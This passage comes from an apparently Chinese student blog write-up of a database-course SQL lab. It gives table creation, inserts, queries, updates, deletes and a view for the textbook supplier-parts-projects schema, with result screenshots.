VALUES(&#x27;P4&#x27;,&#x27;螺丝刀&#x27;,&#x27;红&#x27;,14);<br>INSERT INTO P VALUES(&#x27;P5&#x27;,&#x27;凸轮&#x27;,&#x27;蓝&#x27;,40);<br>INSERT INTO P VALUES(&#x27;P6&#x27;,&#x27;齿轮&#x27;,&#x27;红&#x27;,30);<br><br># 建立工程项目表J<br>CREATE TABLE J<br>(<br>JNO VARCHAR(5) PRIMARY KEY,<br>JNAME VARCHAR(10),<br>CITY VARCHAR(10)<br>);<br><br># 向表J插入数据<br>INSERT INTO J VALUES(&#x27;J1&#x27;,&#x27;三建&#x27;,&#x27;北京&#x27;);<br>INSERT INTO J VALUES(&#x27;J2&#x27;,&#x27;一汽&#x27;,&#x27;长春&#x27;);<br>INSERT INTO J VALUES(&#x27;J3&#x27;,&#x27;弹簧刀&#x27;,&#x27;天津&#x27;);<br>INSERT INTO J VALUES(&#x27;J4&#x27;,&#x27;造船厂&#x27;,&#x27;天津&#x27;);<br>INSERT INTO J VALUES(&#x27;J5&#x27;,&#x27;机车厂&#x27;,&#x27;唐山&#x27;);<br>INSERT INTO J VALUES(&#x27;J6&#x27;,&#x27;无限电厂&#x27;,&#x27;常州&#x27;);<br>INSERT INTO J VALUES(&#x27;J7&#x27;,&#x27;半导体厂&#x27;,&#x27;南京&#x27;);<br><br># 建立供应情况表SPJ<br>CREATE TABLE SPJ<br>(<br>SNO CHAR(5),<br>PNO CHAR(5),<br>JNO CHAR(5),<br>QTY INT,<br>PRIMARY KEY(SNO,PNO,JNO),<br>FOREIGN KEY(SNO) REFERENCES S(SNO),<br>FOREIGN KEY(PNO) REFERENCES P(PNO),<br>FOREIGN KEY(JNO) REFERENCES J(JNO)<br>);<br><br># 向表SPJ插入数据<br>INSERT INTO SPJ VALUES(&#x27;S1&#x27;,&#x27;P1&#x27;,&#x27;J1&#x27;,200);<br>INSERT INTO SPJ VALUES(&#x27;S1&#x27;,&#x27;P1&#x27;,&#x27;J3&#x27;,100);<br>INSERT INTO SPJ VALUES(&#x27;S1&#x27;,&#x27;P1&#x27;,&#x27;J4&#x27;,700);<br>INSERT INTO SPJ VALUES(&#x27;S1&#x27;,&#x27;P2&#x27;,&#x27;J2&#x27;,100);<br>INSERT INTO SPJ VALUES(&#x27;S2&#x27;,&#x27;P3&#x27;,&#x27;J1&#x27;,400);<br>INSERT INTO SPJ VALUES(&#x27;S2&#x27;,&#x27;P3&#x27;,&#x27;J2&#x27;,200);<br>INSERT INTO SPJ VALUES(&#x27;S2&#x27;,&#x27;P3&#x27;,&#x27;J4&#x27;,500);<br>INSERT INTO SPJ VALUES(&#x27;S2&#x27;,&#x27;P3&#x27;,&#x27;J5&#x27;,400);<br>INSERT INTO SPJ VALUES(&#x27;S2&#x27;,&#x27;P5&#x27;,&#x27;J1&#x27;,400);<br>INSERT INTO SPJ VALUES(&#x27;S2&#x27;,&#x27;P5&#x27;,&#x27;J2&#x27;,100);<br>INSERT INTO SPJ VALUES(&#x27;S3&#x27;,&#x27;P1&#x27;,&#x27;J1&#x27;,200);<br>INSERT INTO SPJ VALUES(&#x27;S3&#x27;,&#x27;P3&#x27;,&#x27;J1&#x27;,200);<br>INSERT INTO SPJ VALUES(&#x27;S4&#x27;,&#x27;P5&#x27;,&#x27;J1&#x27;,100);<br>INSERT INTO SPJ VALUES(&#x27;S4&#x27;,&#x27;P6&#x27;,&#x27;J3&#x27;,300);<br>INSERT INTO SPJ VALUES(&#x27;S4&#x27;,&#x27;P6&#x27;,&#x27;J4&#x27;,200);<br>INSERT INTO SPJ VALUES(&#x27;S5&#x27;,&#x27;P2&#x27;,&#x27;J4&#x27;,100);<br>INSERT INTO SPJ VALUES(&#x27;S5&#x27;,&#x27;P3&#x27;,&#x27;J1&#x27;,200);<br>INSERT INTO SPJ VALUES(&#x27;S5&#x27;,&#x27;P6&#x27;,&#x27;J2&#x27;,200);<br>INSERT INTO SPJ VALUES(&#x27;S5&#x27;,&#x27;P6&#x27;,&#x27;J4&#x27;,500);<br></code></pre></div></td></tr></table></figure><p><strong>结果</strong></p><ul><li><p>供应商表S：</p><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220324233303964.png" alt="image-20220324233303964"></p></li><li><p>零件表P：</p><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220324233550612.png" alt="image-20220324233550612"></p></li><li><p>工程项目表J：</p><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220324233528109.png" alt="image-20220324233528109"></p></li><li><p>供应情况表SPJ：</p><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220324233643934.png" alt="image-20220324233643934"></p></li></ul><h4 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h4><ol><li><p>求供应工程J1零件的供应商号码SNO:</p><ul><li><p>SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">SELECT DISTINCT SNO FROM SPJ WHERE JNO=&#x27;J1&#x27;;<br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325102815380.png" alt="image-20220325102815380"></p></li></ul></li><li><p>求供应工程J1零件P1的供应商号码SNO:</p><ul><li><p>SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">SELECT DISTINCT SNO FROM SPJ WHERE JNO=&#x27;J1&#x27; AND PNO=&#x27;P1&#x27;;<br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325102913718.png" alt="image-20220325102913718"></p></li></ul></li><li><p>求供应工程J1零件为红色的供应商号码SNO：</p><ul><li><p>SQL：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> SNO <span class="hljs-keyword">FROM</span> SPJ <span class="hljs-keyword">WHERE</span> JNO<span class="hljs-operator">=</span><span class="hljs-string">&#x27;J1&#x27;</span> <span class="hljs-keyword">AND</span> PNO <span class="hljs-keyword">IN</span> <br>(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> PNO <span class="hljs-keyword">FROM</span> P <span class="hljs-keyword">WHERE</span> COLOR<span class="hljs-operator">=</span><span class="hljs-string">&#x27;红&#x27;</span>);<br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325103030728.png" alt="image-20220325103030728"></p></li></ul></li><li><p>求没有使用天津供应商生产的红色零件的工程号JNO：</p><ul><li><p>SQL：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> JNO <span class="hljs-keyword">FROM</span> J <span class="hljs-keyword">WHERE</span> JNO <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> <br>(<span class="hljs-keyword">SELECT</span> JNO <span class="hljs-keyword">FROM</span> SPJ,P,S <span class="hljs-keyword">WHERE</span><br>S.CITY<span class="hljs-operator">=</span><span class="hljs-string">&#x27;天津&#x27;</span> <span class="hljs-keyword">AND</span><br>P.COLOR<span class="hljs-operator">=</span><span class="hljs-string">&#x27;红&#x27;</span> <span class="hljs-keyword">AND</span><br>S.SNO<span class="hljs-operator">=</span>SPJ.SNO <span class="hljs-keyword">AND</span><br>P.PNO<span class="hljs-operator">=</span>SPJ.PNO);<br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325103213694.png" alt="image-20220325103213694"></p></li></ul></li><li><p>求至少用了供应商S1所供应的全部零件的工程号JNO：</p><ul><li><p>SQL：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> JNO<br><span class="hljs-keyword">FROM</span> SPJ SPJX<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> <span class="hljs-comment">-- 不存在情况:</span><br>(<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br> <span class="hljs-keyword">FROM</span> SPJ SPJY<br> <span class="hljs-keyword">WHERE</span> SNO<span class="hljs-operator">=</span><span class="hljs-string">&#x27;S1&#x27;</span>  <br> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> <span class="hljs-comment">-- S1提供的零件没有被该工程使用 </span><br>(<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br> <span class="hljs-keyword">FROM</span> SPJ SPJZ<br> <span class="hljs-keyword">WHERE</span> SPJZ.PNO<span class="hljs-operator">=</span>SPJY.PNO    <span class="hljs-comment">-- 确定S1的零件名</span><br>         <span class="hljs-keyword">AND</span> SNO<span class="hljs-operator">=</span><span class="hljs-string">&#x27;S1&#x27;</span><span class="hljs-comment">-- 确定零件是S1提供的</span><br><span class="hljs-keyword">AND</span> SPJZ.JNO<span class="hljs-operator">=</span>SPJX.JNO)); <span class="hljs-comment">-- 确定工程</span><br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325111114717.png" alt="image-20220325111114717"></p></li></ul></li></ol><h3 id="第5题"><a href="#第5题" class="headerlink" title="第5题"></a>第5题</h3><p>针对习题4中的4个表试用SQL语言完成以下各项操作：</p><ol><li><p>找出所有供应商的姓名和所在城市：</p><ul><li><p>SQL：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> SNAME,CITY <span class="hljs-keyword">FROM</span> S;<br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325120743410.png" alt="image-20220325120743410"></p></li></ul></li><li><p>找出所有零件的名称、颜色、重量；</p><ul><li><p>SQL：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> PNAME,COLOR,WEIGHT <span class="hljs-keyword">FROM</span> P;<br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><p>   <img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325121417842.png" alt="image-20220325121417842"></p></li></ul></li><li><p>找出使用供应商S1所供应零件的工程号码：</p><ul><li><p>SQL：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> JNO <span class="hljs-keyword">FROM</span> SPJ <span class="hljs-keyword">WHERE</span> SNO<span class="hljs-operator">=</span><span class="hljs-string">&#x27;S1&#x27;</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325121452594.png" alt="image-20220325121452594"></p></li></ul></li><li><p>找出工程项目J2使用的各种零件的名称及其数量：</p><ul><li><p>SQL：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> PNAME,QTY <span class="hljs-keyword">FROM</span> P,SPJ <span class="hljs-keyword">WHERE</span> <br>SPJ.JNO<span class="hljs-operator">=</span><span class="hljs-string">&#x27;J2&#x27;</span> <span class="hljs-keyword">AND</span> P.PNO<span class="hljs-operator">=</span>SPJ.PNO;<br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325121520442.png" alt="image-20220325121520442"></p></li></ul></li><li><p>找出上海厂商供应的所有零件号码：</p><ul><li><p>SQL：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> PNO <span class="hljs-keyword">FROM</span> S,SPJ <span class="hljs-keyword">WHERE</span><br>S.CITY<span class="hljs-operator">=</span><span class="hljs-string">&#x27;上海&#x27;</span> <span class="hljs-keyword">AND</span> S.SNO<span class="hljs-operator">=</span>SPJ.SNO;<br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325121546585.png" alt="image-20220325121546585"></p></li></ul></li><li><p>找出使用上海产的零件的工程名称：</p><ul><li><p>SQL：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> JNO <span class="hljs-keyword">FROM</span> S,SPJ <span class="hljs-keyword">WHERE</span><br>S.CITY<span class="hljs-operator">=</span><span class="hljs-string">&#x27;上海&#x27;</span> <span class="hljs-keyword">AND</span> S.SNO<span class="hljs-operator">=</span>SPJ.SNO;<br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325121633952.png" alt="image-20220325121633952"></p></li></ul></li><li><p>找出没有使用天津产的零件的工程号码：</p><ul><li><p>SQL：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> JNO <span class="hljs-keyword">FROM</span> J <span class="hljs-keyword">WHERE</span> JNO <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span><br>(<span class="hljs-keyword">SELECT</span> JNO <span class="hljs-keyword">FROM</span> S,SPJ <span class="hljs-keyword">WHERE</span><br>S.CITY<span class="hljs-operator">=</span><span class="hljs-string">&#x27;天津&#x27;</span> <span class="hljs-keyword">AND</span> S.SNO<span class="hljs-operator">=</span>SPJ.SNO);<br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325121707581.png" alt="image-20220325121707581"></p></li></ul></li><li><p>把全部红色零件的颜色改成蓝色：</p><ul><li><p>SQL：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> P <span class="hljs-keyword">SET</span> COLOR<span class="hljs-operator">=</span><span class="hljs-string">&#x27;蓝&#x27;</span> <span class="hljs-keyword">WHERE</span> COLOR<span class="hljs-operator">=</span><span class="hljs-string">&#x27;红&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> P; <span class="hljs-comment">-- 用于显示结果</span><br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><p>   <img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325121828186.png" alt="image-20220325121828186"></p></li></ul></li><li><p>由S5供给J4的零件P6改为由S3供应，请作必要的修改：</p><ul><li><p>SQL：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> SPJ <span class="hljs-keyword">SET</span> SNO<span class="hljs-operator">=</span><span class="hljs-string">&#x27;S3&#x27;</span> <span class="hljs-keyword">WHERE</span> SNO<span class="hljs-operator">=</span><span class="hljs-string">&#x27;S5&#x27;</span> <span class="hljs-keyword">AND</span> JNO<span class="hljs-operator">=</span><span class="hljs-string">&#x27;J4&#x27;</span> <span class="hljs-keyword">AND</span> PNO<span class="hljs-operator">=</span><span class="hljs-string">&#x27;P6&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> SPJ; <span class="hljs-comment">-- 用于显示结果</span><br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><p>   <img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325121855651.png" alt="image-20220325121855651"></p></li></ul></li><li><p>从供应商关系中删除S2的记录，并从供应情况关系中删除相应的记录：</p><p>因为表SPJ的外键SNO是表S的主键，故要先从表SPJ中删除S2的记录，在从表S中删除S2的记录</p><ul><li><p>SQL：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> SPJ <span class="hljs-keyword">WHERE</span> SNO<span class="hljs-operator">=</span><span class="hljs-string">&#x27;S2&#x27;</span>;<br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> S <span class="hljs-keyword">WHERE</span> SNO<span class="hljs-operator">=</span><span class="hljs-string">&#x27;S2&#x27;</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><ul><li><p>表SPJ：</p><p>   <img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325122904368.png" alt="image-20220325122904368"></p></li><li><p>表S：</p><p>   <img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325122921502.png" alt="image-20220325122921502"></p></li></ul></li></ul></li><li><p>请将（S2，J6，P4，200）插入供应情况关系：</p><p>因为表SPJ的外键SNO是表S的主键，故在表SPJ插入关于S2的记录前，要先在表S中还原S2的信息</p><ul><li><p>SQL：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> S <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;S2&#x27;</span>,<span class="hljs-string">&#x27;盛锡&#x27;</span>,<span class="hljs-string">&#x27;10&#x27;</span>,<span class="hljs-string">&#x27;北京&#x27;</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> SPJ <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;S2&#x27;</span>,<span class="hljs-string">&#x27;P6&#x27;</span>,<span class="hljs-string">&#x27;J6&#x27;</span>,<span class="hljs-number">200</span>);<br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><ul><li><p>表S：</p><p>   <img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325123114711.png" alt="image-20220325123114711"></p></li><li><p>表SPJ：</p><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325123213720.png" alt="image-20220325123213720"></p></li></ul></li></ul></li></ol><h3 id="第9题"><a href="#第9题" class="headerlink" title="第9题"></a>第9题</h3><p>请为三建工程项目建立一个供应情况的视图，包括供应商代码（SNO）、零件代码（PNO）、供应数量（QTY）：</p><ul><li><p>SQL:</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> SANJIAN <span class="hljs-keyword">AS</span><br><span class="hljs-keyword">SELECT</span> SNO,PNO,QTY <span class="hljs-keyword">FROM</span> SPJ,J<br><span class="hljs-keyword">WHERE</span> SPJ.JNO<span class="hljs-operator">=</span>J.JNO <span class="hljs-keyword">AND</span> J.JNAME<span class="hljs-operator">=</span><span class="hljs-string">&#x27;三建&#x27;</span><br></code></pre></div></td></tr></table></figure></li><li><p>在“视图”中查看结果：</p><p>   <img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325164742884.png" alt="image-20220325164742884"></p></li></ul><p>针对该试图完成下列查询：</p><ol><li><p>找出三建工程项目使用的各种零件代码及其数量：</p><ul><li><p>SQL：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> PNO,QTY <span class="hljs-keyword">FROM</span> SANJIAN;<br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><p>   <img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325164915171.png" alt="image-20220325164915171"></p></li></ul></li><li><p>找出供应商S1的供应情况。</p><ul><li><p>SQL：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> SANJIAN <span class="hljs-keyword">WHERE</span> SNO<span class="hljs-operator">=</span><span 